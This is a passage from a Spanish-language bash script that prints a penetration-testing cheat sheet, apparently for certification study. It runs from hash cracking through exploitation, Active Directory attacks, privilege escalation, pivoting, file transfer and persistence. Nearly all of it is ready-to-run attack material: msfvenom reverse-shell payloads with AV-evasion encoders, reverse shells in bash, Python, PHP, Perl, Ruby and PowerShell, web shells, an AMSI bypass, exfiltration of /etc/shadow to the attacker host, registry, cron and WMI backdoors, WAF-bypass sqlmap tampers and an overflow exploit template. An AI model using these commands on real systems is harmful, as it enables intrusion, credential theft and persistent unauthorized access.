        cmd "hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt --force -O    # Kerberoast"
        cmd "hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt --force -O   # AS-REP"
        cmd "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt"
    }

    # ═══════════════════════════════════════════════════════════════════
    # FASE 6: EXPLOTACIÓN + PAYLOADS
    # ═══════════════════════════════════════════════════════════════════
    exploitation() {
        header "FASE 6 — EXPLOTACIÓN + REVERSE SHELLS + PAYLOADS"
        
        sub "🎯 METASPLOIT"
        cmd "msfconsole -q"
        cmd "  search type:exploit name:\$SERVICE"
        cmd "  search cve:2024"
        cmd "  use exploit/multi/handler"
        cmd "  set PAYLOAD windows/x64/meterpreter/reverse_tcp"
        cmd "  set LHOST \$MY_IP"
        cmd "  set LPORT 443"
        cmd "  exploit -j -z"
        
        sub "📦 MSFVENOM"
        cmd "msfvenom -p linux/x64/shell_reverse_tcp LHOST=\$MY_IP LPORT=443 -f elf -o rev.elf"
        cmd "msfvenom -p windows/x64/shell_reverse_tcp LHOST=\$MY_IP LPORT=443 -f exe -o rev.exe"
        cmd "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=\$MY_IP LPORT=443 -f exe -o met.exe"
        cmd "msfvenom -p java/jsp_shell_reverse_tcp LHOST=\$MY_IP LPORT=443 -f war -o rev.war"
        cmd "msfvenom -p php/reverse_php LHOST=\$MY_IP LPORT=443 -f raw > rev.php"
        cmd "msfvenom -p python/shell_reverse_tcp LHOST=\$MY_IP LPORT=443 -f raw > rev.py"
        cmd "msfvenom -p aspx/meterpreter/reverse_tcp LHOST=\$MY_IP LPORT=443 -f aspx -o rev.aspx"
        
        sub "🛡️ EVASIÓN AV"
        cmd "msfvenom -p windows/x64/shell_reverse_tcp LHOST=\$MY_IP LPORT=443 -e x64/xor -i 5 -f exe -o encoded.exe"
        cmd "msfvenom -p windows/x64/shell_reverse_tcp LHOST=\$MY_IP LPORT=443 -e x64/zutto_dekiru -i 5 -f exe -o zutto.exe"
        cmd "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=\$MY_IP LPORT=443 -f powershell -o shellcode.ps1"
        
        sub "🐧 LINUX REVERSE SHELLS"
        note "Bash:"
        ex "bash -i >& /dev/tcp/\$MY_IP/443 0>&1"
        ex "exec 5<>/dev/tcp/\$MY_IP/443; cat <&5 | while read line; do \$line 2>&5 >&5; done"
        note "Python:"
        ex "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"\$MY_IP\",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
        note "PHP:"
        ex "php -r '\$sock=fsockopen(\"\$MY_IP\",443);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        note "Netcat:"
        ex "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc \$MY_IP 443 >/tmp/f"
        note "Perl:"
        ex "perl -e 'use Socket;\$i=\"\$MY_IP\";\$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}'"
        note "Ruby:"
        ex "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"\$MY_IP\",\"443\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
        
        sub "🪟 WINDOWS REVERSE SHELLS"
        note "PowerShell (completa):"
        ex 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('"'"'$MY_IP'"'"',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb + '"'"'PS '"'"' + (pwd).Path + '"'"'> '"'"';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"'
        note "Nishang:"
        ex "powershell -c \"IEX(New-Object Net.WebClient).downloadString('http://\$MY_IP:8000/Invoke-PowerShellTcp.ps1')\""
        
        sub "🌐 WEB SHELLS"
        note "PHP: <?php system(\$_REQUEST['cmd']); ?>"
        note "ASP: <% Execute(Request(\"cmd\")) %>"
        note "ASPX: <%@ Page Language=\"C#\" %> <% System.Diagnostics.Process.Start(\"cmd.exe\", \"/c \" + Request[\"cmd\"]); %>"
        
        sub "🧪 AMSI BYPASS"
        ex 'powershell -Command "[Ref].Assembly.GetType('"'"'System.Management.Automation.AmsiUtils'"'"').GetField('"'"'amsiInitFailed'"'"','"'"'NonPublic,Static'"'"').SetValue($null,$true)"'
    }

    # ═══════════════════════════════════════════════════════════════════
    # FASE 7: ACTIVE DIRECTORY
    # ═══════════════════════════════════════════════════════════════════
    active_directory() {
        header "FASE 7 — ACTIVE DIRECTORY ATTACKS"
        
        sub "🏢 ENUMERACIÓN AD"
        cmd "bloodhound-python -d \$DOMAIN -u \$USER -p \$PASS -ns \$DC_IP -c All"
        cmd "netexec smb \$DC_IP -u \$USER -p \$PASS --users"
        cmd "netexec smb \$DC_IP -u \$USER -p \$PASS --groups"
        cmd "netexec smb \$DC_IP -u \$USER -p \$PASS --local-groups"
        cmd "netexec smb \$DC_IP -u \$USER -p \$PASS --loggedon-users"
        cmd "netexec smb \$DC_IP -u \$USER -p \$PASS --shares"
        cmd "netexec smb \$DC_IP -u \$USER -p \$PASS --sessions"
        cmd "netexec smb \$DC_IP -u \$USER -p \$PASS --pass-pol"
        cmd "ldapdomaindump -u \"\$DOMAIN\\\\\$USER\" -p \$PASS \$DC_IP"
        
        sub "🎭 AS-REP ROASTING (sin credenciales)"
        cmd "netexec ldap \$DC_IP -u '' -p '' --asreproast asrep_hashes.txt"
        cmd "GetNPUsers.py \$DOMAIN/ -usersfile users.txt -dc-ip \$DC_IP -format hashcat"
        
        sub "🔑 KERBEROASTING"
        cmd "netexec ldap \$DC_IP -u \$USER -p \$PASS --kerberoast kerb_hashes.txt"
        cmd "GetUserSPNs.py \$DOMAIN/\$USER:\$PASS -dc-ip \$DC_IP -request -outputfile kerb_hashes.txt"
        cmd "hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt --force -O"
        
        sub "🔐 PASS THE HASH"
        cmd "netexec smb \$TARGET -u Administrator -H \$NTLM_HASH"
        cmd "psexec.py \$DOMAIN/Administrator@\$TARGET -hashes :\$NTLM_HASH"
        cmd "wmiexec.py \$DOMAIN/Administrator@\$TARGET -hashes :\$NTLM_HASH"
        cmd "smbexec.py \$DOMAIN/Administrator@\$TARGET -hashes :\$NTLM_HASH"
        
        sub "⚡ DCSYNC"
        cmd "secretsdump.py -just-dc \$DOMAIN/Administrator:\$PASS@\$DC_IP"
        cmd "netexec smb \$DC_IP -u Administrator -p \$PASS --ntds"
        
        sub "🥇 GOLDEN TICKET"
        note "1. Extraer hash krbtgt:"
        ex "secretsdump.py \$DOMAIN/Administrator:\$PASS@\$DC_IP -just-dc-user krbtgt"
        note "2. Crear ticket (mimikatz):"
        ex "mimikatz # kerberos::golden /domain:\$DOMAIN /sid:\$SID /krbtgt:\$HASH /user:Administrator /ptt"
        note "3. Linux (impacket):"
        ex "ticketer.py -nthash \$KRBTGT_HASH -domain \$DOMAIN -domain-sid \$DOMAIN_SID Administrator"
        ex "export KRB5CCNAME=Administrator.ccache"
        ex "psexec.py \$DOMAIN/Administrator@\$TARGET -k -no-pass"
        
        sub "🥈 SILVER TICKET"
        ex "mimikatz # kerberos::golden /domain:\$DOMAIN /sid:\$SID /target:\$SERVICE.\$DOMAIN /rc4:\$SERVICE_NTLM /service:\$SERVICE_NAME /user:Administrator /ptt"
        
        sub "🔁 RELAY (Responder + ntlmrelayx)"
        cmd "responder -I eth0 -dwv"
        cmd "ntlmrelayx.py -tf targets.txt -smb2support"
        cmd "ntlmrelayx.py -t smb://\$DC_IP -smb2support"
        
        sub "📋 ACIs ABUSABLES"
        cmd "netexec ldap \$DC_IP -u \$USER -p \$PASS -M maq"
        note "GenericAll sobre usuario → reset password"
        note "GenericWrite sobre usuario → ScriptPath / Logon Script"
    }

    # ═══════════════════════════════════════════════════════════════════
    # FASE 8: PRIVILEGE ESCALATION (LINUX)
    # ═══════════════════════════════════════════════════════════════════
    privesc_linux() {
        header "FASE 8.1 — PRIVILEGE ESCALATION (LINUX)"
        
        sub "KERNEL & OS"
        cmd "uname -a"
        cmd "cat /etc/os-release"
        cmd "cat /etc/issue"
        
        sub "SUDO"
        cmd "sudo -l"
        cmd "sudo -u root /bin/bash"
        cmd "sudo -u#-1 /bin/bash"
        
        sub "SUID"
        cmd "find / -perm -4000 -type f 2>/dev/null"
        cmd "find / -perm -u=s -type f 2>/dev/null"
        
        sub "CAPABILITIES"
        cmd "getcap -r / 2>/dev/null"
        
        sub "CRONTAB"
        cmd "cat /etc/crontab"
        cmd "ls -la /etc/cron*"
        cmd "cat /etc/cron*"
        
        sub "PROCESOS Y RED"
        cmd "ps aux"
        cmd "ss -tlnp"
        cmd "netstat -tlnp"
        cmd "cat /proc/1/cgroup | grep -i docker    # Docker?"
        
        sub "ARCHIVOS DE INTERÉS"
        cmd "find / -writable -type f 2>/dev/null | grep -v proc"
        cmd "find / -name \"id_rsa\" -o -name \"*.kdbx\" -o -name \"*.ovpn\" 2>/dev/null"
        cmd "find / -name \"*.sql\" -o -name \"*.sqlite\" 2>/dev/null"
        
        sub "HERRAMIENTAS AUTOMÁTICAS"
        cmd "wget http://\$MY_IP:8000/linpeas.sh -O linpeas.sh && bash linpeas.sh"
        cmd "curl http://\$MY_IP:8000/linpeas.sh | sh"
        cmd "wget http://\$MY_IP:8000/pspy64 -O pspy64 && chmod +x pspy64 && ./pspy64"
        cmd "wget http://\$MY_IP:8000/lse.sh -O lse.sh && bash lse.sh"
        
        sub "🔥 TÉCNICAS DE ESCALADA"
        note "Kernel exploits: Dirty Pipe (CVE-2022-0847), PwnKit (CVE-2021-4034), Dirty Cow (CVE-2016-5195)"
        note "PATH hijacking: echo '#!/bin/bash' > /tmp/ls → echo 'chmod +s /bin/bash' >> /tmp/ls → export PATH=/tmp:\$PATH"
        note "Wildcard exploitation (tar): touch -- \"--checkpoint=1\" && touch -- \"--checkpoint-action=exec=bash shell.sh\""
        note "LXD/LXC (grupo lxd): lxc image import alpine.tar.gz... → lxc init alpine priv -c security.privileged=true"
    }

    # ═══════════════════════════════════════════════════════════════════
    # FASE 9: PRIVILEGE ESCALATION (WINDOWS)
    # ═══════════════════════════════════════════════════════════════════
    privesc_windows() {
        header "FASE 8.2 — PRIVILEGE ESCALATION (WINDOWS)"
        
        sub "ENUMERACIÓN RÁPIDA (CMD)"
        cmd "whoami && whoami /all && whoami /priv"
        cmd "systeminfo"
        cmd "net users && net localgroup Administrators"
        cmd "wmic qfe get Caption,Description,HotFixID,InstalledOn"
        cmd "wmic service get name,displayname,pathname,startmode | findstr /i 'auto'"
        cmd "wmic product get name,version"
        cmd "schtasks /query /fo LIST /v"
        
        sub "ENUMERACIÓN PowerShell"
        cmd "IEX(New-Object Net.WebClient).downloadString('http://\$MY_IP:8000/PowerUp.ps1') && Invoke-AllChecks"
        cmd "IEX(New-Object Net.WebClient).downloadString('http://\$MY_IP:8000/jaws-enum.ps1')"
        
        sub "🔥 TOKEN IMPERSONATION (SeImpersonate / SeAssignPrimaryToken)"
        note "JuicyPotato (Server 2008-2016):"
        ex ".\\JuicyPotato.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -t *"
        note "PrintSpoofer (Server 2016-2019):"
        ex ".\\PrintSpoofer64.exe -i -c cmd"
        ex ".\\PrintSpoofer64.exe -c \"nc.exe \$MY_IP 443 -e cmd\""
        note "GodPotato (Server 2019-2022):"
        ex ".\\GodPotato -cmd \"cmd /c whoami\""
        note "SharpEfsPotato:"
        ex ".\\SharpEfsPotato.exe -p C:\\Windows\\System32\\cmd.exe"
        
        sub "📂 UNQUOTED SERVICE PATHS"
        cmd "wmic service get name,displayname,pathname,startmode | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\"\""
        note "Si hay un path sin comillas:"
        ex "copy shell.exe \"C:\\Program Files\\Vulnerable\\binary.exe\""
        ex "sc stop SERVICE && sc start SERVICE"
        
        sub "🔧 WEAK SERVICE PERMISSIONS"
        cmd "accesschk.exe /accepteula -uwcqv \"Everyone\" *"
        ex "sc config SERVICE_NAME binPath= \"cmd.exe /c C:\\shell.exe\""
        ex "sc start SERVICE_NAME"
        
        sub "💿 ALWAYS INSTALL ELEVATED"
        cmd 'reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated'
        cmd 'reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated'
        note "Si está en 1: msfvenom -p windows/x64/shell_reverse_tcp LHOST=\$MY_IP LPORT=443 -f msi -o install.msi"
        note "Ejecutar: msiexec /quiet /qn /i install.msi"
        
        sub "🔑 DUMPING CREDENTIALS"
        note "Mimikatz:"
        ex "privilege::debug"
        ex "sekurlsa::logonpasswords"
        ex "lsadump::sam"
        ex "lsadump::secrets"
        ex "lsadump::dcsync /user:Administrator"
        note "SAM (reg save):"
        ex "reg save hklm\\sam sam.save && reg save hklm\\system system.save"
        ex "# En Kali: impacket-secretsdump -sam sam.save -system system.save LOCAL"
        note "LaZagne:"
        ex ".\\lazagne.exe all"
    }

    # ═══════════════════════════════════════════════════════════════════
    # FASE 9: PIVOTING, TUNNELING & PORT FORWARDING
    # ═══════════════════════════════════════════════════════════════════
    pivoting() {
        header "FASE 9 — PIVOTING, TUNNELING & PORT FORWARDING"
        
        sub "🔀 CHISEL"
        note "Atacante (servidor):"
        cmd "chisel server -p 8080 --reverse -v"
        note "Víctima (cliente):"
        cmd "chisel client \$MY_IP:8080 R:1080:socks"
        note "Port forwarding:"
        cmd "chisel client \$MY_IP:8080 R:3306:127.0.0.1:3306"
        note "Uso con proxychains:"
        cmd "proxychains4 nmap -sV -p 3306 127.0.0.1"
        
        sub "🔐 SSH TUNNELING"
        note "Local port forwarding:"
        cmd "ssh -L 8080:internal-server:80 user@\$JUMP_HOST -N"
        note "Remote port forwarding:"
        cmd "ssh -R 8080:localhost:80 user@\$MY_IP -N"
        note "SOCKS proxy dinámico:"
        cmd "ssh -D 1080 user@\$JUMP_HOST -N"
        cmd "proxychains4 nmap -sV \$INTERNAL_TARGET"
        
        sub "⚡ LIGOLO-NG"
        note "Atacante:"
        cmd "sudo ip tuntap add dev ligolo mode tun"
        cmd "sudo ip link set dev ligolo up"
        cmd "sudo ip route add 172.16.0.0/24 dev ligolo"
        cmd "./proxy -selfcert -laddr 0.0.0.0:11601"
        note "Víctima:"
        cmd "./agent -connect \$MY_IP:11601 -ignore-cert"
        note "En consola proxy: session → tunnel_add 172.16.0.0/24 → start"
        
        sub "🌐 METASPLOIT PIVOTING"
        cmd "run autoroute -s 172.16.0.0/24    # Desde meterpreter"
        cmd "background"
        cmd "use auxiliary/server/socks_proxy"
        cmd "set SRVHOST 127.0.0.1; set SRVPORT 1080; run"
        note "Otra terminal: proxychains4 nmap -sV 172.16.0.100"
        
        sub "🔁 SOCAT RELAY"
        cmd "socat TCP-LISTEN:4444,fork,reuseaddr TCP:\$INTERNAL_TARGET:3389"
        note "Reverse shell relay (Víctima → Jump → Atacante):"
        ex "# En jump box: socat TCP-LISTEN:5555,fork TCP:\$MY_IP:443"
        ex "# En víctima: bash -i >& /dev/tcp/\$JUMP_BOX/5555 0>&1"
    }

    # ═══════════════════════════════════════════════════════════════════
    # FASE 10: FILE TRANSFERS
    # ═══════════════════════════════════════════════════════════════════
    file_transfers() {
        header "FASE 10 — FILE TRANSFERS"
        
        sub "📤 SERVIDORES (Kali)"
        cmd "python3 -m http.server 80"
        cmd "python2 -m SimpleHTTPServer 80"
        cmd "php -S 0.0.0.0:80"
        cmd "ruby -run -ehttpd . -p80"
        cmd "nc -nlvp 443 < shell.exe    # Transferencia inversa"
        
        sub "📥 DOWNLOAD (Linux target)"
        cmd "wget http://\$MY_IP/shell.sh"
        cmd "curl -O http://\$MY_IP/shell.sh"
        cmd "bash <(curl -s http://\$MY_IP/script.sh)"
        cmd "nc \$MY_IP 443 > shell.sh"
        
        sub "📥 DOWNLOAD (Windows target)"
        cmd "certutil -urlcache -f http://\$MY_IP/shell.exe shell.exe"
        cmd 'powershell -c "wget http://$MY_IP/shell.exe -OutFile shell.exe"'
        cmd 'powershell -c "Invoke-WebRequest -Uri http://$MY_IP/shell.exe -OutFile shell.exe"'
        cmd 'bitsadmin /transfer job /download /priority high http://$MY_IP/shell.exe C:\shell.exe'
        cmd 'curl.exe -o shell.exe http://$MY_IP/shell.exe'
        
        sub "📤 EXFILTRACIÓN"
        note "Linux:"
        ex "cat /etc/passwd | base64 | curl -d @- http://\$MY_IP/"
        ex "cat /etc/shadow | nc \$MY_IP 443"
        note "Windows:"
        ex "certutil -encode secret.txt encoded.txt"
        ex 'powershell -c "$wc=New-Object System.Net.WebClient;$wc.UploadFile('"'"'http://$MY_IP/upload'"'"', '"'"'secret.txt'"'"')"'
    }

    # ═══════════════════════════════════════════════════════════════════
    # FASE 11: TRATAMIENTO DE TTY
    # ═══════════════════════════════════════════════════════════════════
    tty_treatment() {
        header "FASE 11 — TRATAMIENTO DE TTY (S4vitar Style)"
        
        note "Método 1 — Script + Ctrl+Z + stty:"
        ex "script /dev/null -c bash"
        ex "Ctrl+Z"
        ex "stty raw -echo; fg"
        ex "reset xterm"
        ex "export TERM=xterm"
        ex "export SHELL=bash"
        ex "stty rows 42 columns 168"
        
        note "Método 2 — Python:"
        ex "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
        ex "export TERM=xterm"
        ex "Ctrl+Z → stty raw -echo; fg → reset xterm"
        
        note "Método 3 — Socat:"
        ex "# Atacante: socat file:\$(tty),raw,echo=0 tcp-listen:4444"
        ex "# Víctima: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:\$MY_IP:4444"
        
        note "Ver dimensiones: stty size"
    }

    # ═══════════════════════════════════════════════════════════════════
    # FASE 12: PERSISTENCIA
    # ═══════════════════════════════════════════════════════════════════
    persistence() {
        header "FASE 12 — PERSISTENCIA"
        
        sub "🐧 LINUX"
        note "Cron:"
        ex '(crontab -l; echo "*/5 * * * * /bin/bash -c \"bash -i >& /dev/tcp/'"'"'$MY_IP'"'"'/443 0>&1\"") | crontab -'
        note "SSH Key:"
        ex "mkdir -p ~/.ssh && echo '\$PUB_KEY' >> ~/.ssh/authorized_keys"
        note "Systemd service:"
        ex "[Unit]"
        ex "[Service]"
        ex "ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/\$MY_IP/443 0>&1'"
        ex "[Install]"
        ex "WantedBy=multi-user.target"
        
        sub "🪟 WINDOWS"
        note "Registry Run:"
        ex 'reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\shell.exe"'
        note "Scheduled Task:"
        ex 'schtasks /create /tn Backdoor /tr "C:\shell.exe" /sc minute /mo 5'
        note "WMI Persistence:"
        ex 'wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE Name="Backdoor", EventNameSpace="root\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA '"'"'Win32_PerfFormattedData_PerfOS_System'"'"'"'
    }

    # ═══════════════════════════════════════════════════════════════════
    # FASE 13: HERRAMIENTAS RÁPIDAS & ONE-LINERS
    # ═══════════════════════════════════════════════════════════════════
    quick_tools() {
        header "FASE 13 — HERRAMIENTAS RÁPIDAS & ONE-LINERS"
        
        sub "🎯 ESCANEO COMPLETO EN UN SOLO COMANDO"
        cmd 'ports=$(nmap -p- --open -T5 -n -Pn --min-rate 5000 $TARGET | grep ^[0-9] | cut -d/ -f1 | tr "\n" "," | sed "s/,$//") && nmap -sCV -p $ports -n -Pn --min-rate 5000 -oN full_scan $TARGET'
        
        sub "🔍 DETECTAR WAF"
        cmd "wafw00f http://\$TARGET && identywaf http://\$TARGET"
        
        sub "💉 SQLMAP AUTOMÁTICO CON WAF BYPASS"
        cmd "sqlmap -u 'http://\$TARGET/page?id=1' --batch --level 5 --risk 3 --tamper=between,space2comment,randomcase --random-agent --flush-session"
        
        sub "🔎 DIRECTORIOS + EXTENSIONES"
        cmd "gobuster dir -u http://\$TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -t 100 -x php,asp,aspx,txt,zip,bak,old,inc,sql -q"
        
        sub "📋 ENUMERACIÓN PUERTOS + SERVICIOS (rápida)"
        cmd "nmap -sCV -p 21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1433,1521,2049,3306,3389,5432,5900,5985,5986,6379,8080,8443,27017 \$TARGET -oA servicios"
        
        sub "🔄 NETEXEC — USUARIOS + SHARES + OS"
        cmd "netexec smb \$TARGET -u '' -p '' --shares --users --os"
        cmd "netexec ldap \$DC_IP -u \$USER -p \$PASS --users --groups --pass-pol"
        
        sub "🏴 BLOODHOUND — RECOLECCIÓN COMPLETA"
        cmd "bloodhound-python -d \$DOMAIN -u \$USER -p \$PASS -ns \$DC_IP -c All --zip"
        
        sub "🔥 KERBEROAST + AS-REP (un solo comando)"
        cmd "netexec ldap \$DC_IP -u \$USER -p \$PASS --kerberoast kerb.txt && netexec ldap \$DC_IP -u \$USER -p \$PASS --asreproast asrep.txt"
        
        sub "🔄 PASS THE HASH + EJECUCIÓN"
        cmd "netexec smb \$TARGET -u Administrator -H \$HASH -x whoami && netexec smb \$TARGET -u Administrator -H \$HASH -X 'powershell -enc \$enc'"
        
        sub "🌐 SERVIDOR WEB + DOWNLOAD (un solo comando)"
        cmd "python3 -m http.server 80 &; curl -O http://\$MY_IP/shell.sh; fg"
    }

    # ═══════════════════════════════════════════════════════════════════
    # FASE 14: WAF EVASION — TAMPER SCRIPTS DE SQLMAP
    # ═══════════════════════════════════════════════════════════════════
    waf_evasion() {
        header "FASE 14 — WAF EVASION (TAMPER SCRIPTS SQLMAP)"
        
        note "Tamper scripts más efectivos para cada WAF:"
        
        sub "🛡️ MODSECURITY"
        cmd "sqlmap -u 'http://\$TARGET?id=1' --tamper=modsecurityversion,space2comment,bluecoat,charencode --random-agent --batch"
        
        sub "🛡️ CLOUDFLARE"
        cmd "sqlmap -u 'http://\$TARGET?id=1' --tamper=between,randomcase,space2comment,charencode --random-agent --batch"
        cmd "sqlmap -u 'http://\$TARGET?id=1' --tamper=between,randomcase,space2comment --random-agent --dbms mysql --flush-session --batch"
        
        sub "🛡️ IMPERVA / INCAPSULA"
        cmd "sqlmap -u 'http://\$TARGET?id=1' --tamper=between,charencode,charunicodeencode,equaltolike,greatest --batch"
        
        sub "🛡️ F5 BIG-IP ASM"
        cmd "sqlmap -u 'http://\$TARGET?id=1' --tamper=between,space2dash,space2comment --batch"
        
        sub "🛡️ AKAMAI"
        cmd "sqlmap -u 'http://\$TARGET?id=1' --tamper=between,charencode,charunicodeencode --batch --random-agent"
        
        sub "🛡️ BARRACUDA"
        cmd "sqlmap -u 'http://\$TARGET?id=1' --tamper=between,space2comment --batch --random-agent"
        
        sub "🛡️ AWS WAF"
        cmd "sqlmap -u 'http://\$TARGET?id=1' --tamper=space2comment,randomcase,between --random-agent --batch"
        
        sub "🧪 BYPASS UNIVERSAL (probar en orden)"
        note "1. --tamper=between"
        note "2. --tamper=space2comment"
        note "3. --tamper=space2plus"
        note "4. --tamper=randomcase"
        note "5. --tamper=charencode"
        note "6. --tamper=charunicodeencode"
        note "7. --tamper=percentage"
        note "8. --tamper=halfversionedmorekeywords"
        note "9. --tamper=bluecoat"
        note "10. --tamper=modsecurityversion"
        note "11. --tamper=apostrophemask"
        note "12. --tamper=greatest"
        note "13. --tamper=equaltolike"
        note "14. --tamper=multiplespaces"
        note "15. --tamper=nonrecursivereplacement"
        
        sub "🚀 COMBOS AVANZADOS"
        note "Mega bypass:"
        cmd "sqlmap -u 'http://\$TARGET?id=1' --tamper=between,charencode,charunicodeencode,equaltolike,greatest,space2comment,randomcase,modsecurityversion,bluecoat --random-agent --batch --level 5 --risk 3"
        
        note "Bypass + Hex (evita filtros de caracteres):"
        cmd "sqlmap -u 'http://\$TARGET?id=1' --tamper=between --hex --random-agent --batch"
    }

    # ═══════════════════════════════════════════════════════════════════
    # FASE 15: BUFFER OVERFLOW (BINARIO)
    # ═══════════════════════════════════════════════════════════════════
    buffer_overflow() {
        header "FASE 15 — BUFFER OVERFLOW (BINARIO)"
        
        sub "🔬 MONA (Immunity Debugger)"
        note "!mona config -set workingfolder c:\\logs\\%p"
        note "!mona module"
        note "!mona findmsp"
        note "!mona jmp -r esp -m \"module.dll\""
        note "!mona bytearray -cpb \"\\x00\\x0a\\x0d\""
        note "!mona compare -f c:\\logs\\module\\bytearray.bin -a 0x00XXXXXX"
        
        sub "📐 PATTERN"
        cmd "/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000"
        cmd "/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0xXXXXXXX"
        
        sub "🧮 CALCULAR OFFSET"
        note "En Python:"
        ex "offset = cyclic_find(b'kaaa')  # pwntools"
        note "En MSF: pattern_offset.rb -q 0x69413169"
        
        sub "⚡ BADCHARS"
        note "Generar array:"
        ex 'badchars = "\\x00\\x0a\\x0d\\x20"  # Añadir según se descubran'
        note "Generar bytearray excluyendo badchars:"
        ex "!mona bytearray -cpb \"\\x00\\x0a\\x0d\""
        
        sub "🛠️ EXPLOIT TEMPLATE (Python)"
        ex '#!/usr/bin/env python3'
        ex 'import socket, sys'
        ex ''
        ex '# Config'
        ex 'RHOST = "10.10.10.10"'
        ex 'RPORT = 1337'
        ex 'offset = 2002'
        ex 'jmp_esp = 0x625011af  # !mona jmp -r esp -m "essfunc.dll"'
        ex ''
        ex '# Shellcode (msfvenom)'
        ex '# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -b "\\x00\\x0a\\x0d" -f python -v shellcode'
        ex 'shellcode = b""'
        ex ''
        ex '# Padding NOPs'
        ex 'padding = b"\\x90" * 16'
        ex ''
        ex '# Build payload'
        ex 'payload = b"A" * offset'
        ex 'payload += p32(jmp_esp)'
        ex 'payload += padding'
        ex 'payload += shellcode'
        ex ''
        ex '# Send'
        ex 's = socket.socket()'
        ex 's.connect((RHOST, RPORT))'
        ex 's.send(payload)'
        ex 's.close()'
    }

    # ═══════════════════════════════════════════════════════════════
    # MOSTRAR SEGÚN ARGUMENTO
    # ═══════════════════════════════════════════════════════════════
    case "$section" in
        all)
            recon_passive; recon_active; enum_services; vuln_scan; web_attacks; 
            password_attacks; exploitation; active_directory; privesc_linux; 
            privesc_windows; pivoting; file_transfers; tty_treatment; 
            persistence; quick_tools; waf_evasion; buffer_overflow
            ;;
        0|recon|recon-passive|reconnaissance|osint)
            recon_passive
            ;;
        1|active|recon-active)
            recon_active
            ;;
        2|enum|enumeration|services)
            enum_services
            ;;
        3|vuln|vulnerability|scan)
            vuln_scan
            ;;
        4|web|web-attacks|waf|bypass)
            web_attacks
            ;;
        5|pass|password|crack|brute)
            password_attacks
            ;;
        6|exploit|exploitation|shells|payload|msf)
            exploitation
            ;;
        7|ad|active-directory|kerberos|domain)
            active_directory
            ;;
        8|privesc|privesc-linux|linux-escalation|pe)
            privesc_linux
            ;;
        9|privesc-windows|windows-escalation|pe-win)
            privesc_windows
            ;;
        10|pivot|pivoting|tunnel|forwarding)
            pivoting
            ;;
        11|transfers|files|download|exfil)
            file_transfers
            ;;
        12|tty|terminal|treatment)
            tty_treatment
            ;;
        13|persist|persistence|backdoor)
            persistence
            ;;
        14|quick|tools|oneliner|rapido)
            quick_tools
            ;;
        15|waf-evasion|tamper|evasion)
            waf_evasion
            ;;
        16|overflow|buffer|bof|binary)
            buffer_overflow
            ;;
        help|--help|-h)
            echo -e "${C}╔══════════════════════════════════════════════════════════════╗${N}"
            echo -e "${C}║  ${W}🏴‍☠️  CPTS CHEAT SHEET — USO${N}"
            echo -e "${C}╠══════════════════════════════════════════════════════════════╣${N}"
            echo -e "${C}║  ${G}hack${N}                         → Muestra todo       ${C}║${N}"
            echo -e "${C}║  ${G}hack all${N}                     → Igual que anterior ${C}║${N}"
            echo -e "${C}║  ${G}hack recon${N}                   → OSINT              ${C}║${N}"
            echo -e "${C}║  ${G}hack enum${N}                    → Enumeración        ${C}║${N}"
            echo -e "${C}║  ${G}hack web${N}                     → Web attacks+WAF    ${C}║${N}"
            echo -e "${C}║  ${G}hack ad${N}                      → Active Directory   ${C}║${N}"
            echo -e "${C}║  ${G}hack privesc${N}                 → Linux PE           ${C}║${N}"
            echo -e "${C}║  ${G}hack privesc-windows${N}         → Windows PE         ${C}║${N}"
            echo -e "${C}║  ${G}hack exploit${N}                 → Exploits+Shells    ${C}║${N}"
            echo -e "${C}║  ${G}hack pivot${N}                   → Pivoting           ${C}║${N}"
            echo -e "${C}║  ${G}hack waf-evasion${N}             → WAF Bypass tamper  ${C}║${N}"
            echo -e "${C}║  ${G}hack overflow${N}                → Buffer Overflow    ${C}║${N}"
            echo -e "${C}║  ${G}hack tty${N}                     → TTY treatment      ${C}║${N}"
            echo -e "${C}║  ${G}hack files${N}                   → File transfers     ${C}║${N}"
            echo -e "${C}║  ${G}hack tools${N}                   → One-liners rápidos ${C}║${N}"
            echo -e "${C}╚══════════════════════════════════════════════════════════════╝${N}"
            echo ""
